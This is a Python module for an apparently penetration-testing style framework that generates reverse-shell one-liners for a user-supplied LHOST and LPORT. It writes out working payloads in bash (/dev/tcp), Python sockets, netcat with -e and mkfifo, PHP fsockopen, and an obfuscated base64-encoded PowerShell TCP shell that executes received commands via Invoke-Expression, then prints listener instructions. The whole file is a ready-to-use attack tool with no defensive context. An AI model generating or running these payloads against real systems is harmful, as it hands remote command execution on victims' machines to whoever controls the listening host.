"""Генератор reverse-shell one-liner'ов."""
import base64

from framework import Module, C


class RevShell(Module):
    name = "revshell"
    description = "Generate reverse shell one-liners (bash/python/nc/php/ps)"
    author = "you"

    options = {
        "LHOST": {"value": None, "required": True, "description": "Your IP/hostname"},
        "LPORT": {"value": "4444", "required": True, "description": "Your port"},
        "TYPE": {
            "value": "bash", "required": False,
            "choices": ("bash", "bash2", "python", "nc", "nc_mkfifo", "php", "powershell"),
            "description": "bash|bash2|python|nc|nc_mkfifo|php|powershell",
        },
    }

    def payload(self):
        errors = self.validate()
        if errors:
            raise ValueError("; ".join(errors))
        lh, lp, kind = self.get("LHOST"), self.get("LPORT"), self.get("TYPE").lower()
        powershell = (
            f"$client=[System.Net.Sockets.TcpClient]::new('{lh}',{int(lp)});"
            "try{$stream=$client.GetStream();"
            "$reader=[System.IO.StreamReader]::new($stream);"
            "$writer=[System.IO.StreamWriter]::new($stream);"
            "$writer.AutoFlush=$true;$writer.Write('PS> ');"
            "while(($line=$reader.ReadLine()) -ne $null){"
            "try{$result=Invoke-Expression $line 2>&1 | Out-String}"
            "catch{$result=$_ | Out-String};"
            "$writer.Write($result);$writer.Write('PS> ')}}"
            "finally{$client.Close()}"
        )
        # UTF-16LE preserves PowerShell variables across cmd/PowerShell quoting.
        encoded_ps = base64.b64encode(powershell.encode("utf-16le")).decode("ascii")
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lh}/{lp} 0>&1",
            "bash2": f"bash -c 'bash -i >& /dev/tcp/{lh}/{lp} 0>&1'",
            "python": (
                "python3 -c 'import socket,subprocess,os;s=socket.socket();"
                f's.connect(("{lh}",{int(lp)}));'
                "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
                'subprocess.call(["/bin/sh","-i"])\''
            ),
            "nc": f"nc -e /bin/sh {lh} {lp}",
            "nc_mkfifo": (
                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
                f"nc {lh} {lp} >/tmp/f"
            ),
            "php": (
                f"php -r '$sock=fsockopen(\"{lh}\",{int(lp)});"
                'exec("/bin/sh -i <&3 >&3 2>&3");\''
            ),
            "powershell": f"powershell -NoProfile -EncodedCommand {encoded_ps}",
        }
        return payloads[kind]

    def run(self):
        print(f"\n{C.G}{self.payload()}{C.END}\n")
        print(f"{C.DIM}Run: listener {self.get('LPORT')}; then sessions -i <id>{C.END}")
